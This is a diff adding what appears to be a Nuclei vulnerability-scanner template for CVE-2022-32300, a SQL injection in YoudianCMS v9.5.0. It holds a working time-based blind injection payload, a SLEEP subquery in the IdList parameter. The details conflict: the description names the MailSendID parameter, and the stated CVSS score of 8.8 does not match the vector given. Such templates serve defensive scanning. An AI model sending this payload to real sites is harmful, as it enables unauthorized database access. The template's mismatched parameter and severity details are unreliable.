@@ -1,0 +1,30 @@
+id: CVE-2022-32300
+info:
+  name: YoudianCMS v9.5.0 SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    YoudianCMS v9.5.0 has a SQL Injection vulnerability in the MailSendID parameter, which can lead to sensitive data exposure.
+  classification:
+    cve-id: CVE-2022-32300
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+  tags: sql-injection
+
+variables:
+  sleep_time: "5"
+
+http:
+  - raw:
+      - |
+        GET /index.php/api/GetSpecial?ChannelID=1&IdList=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP({{sleep_time}})))A) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Scanner
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: dsl
+        dsl:
+          - "to_number(response_time) > {{to_number(sleep_time)}}"
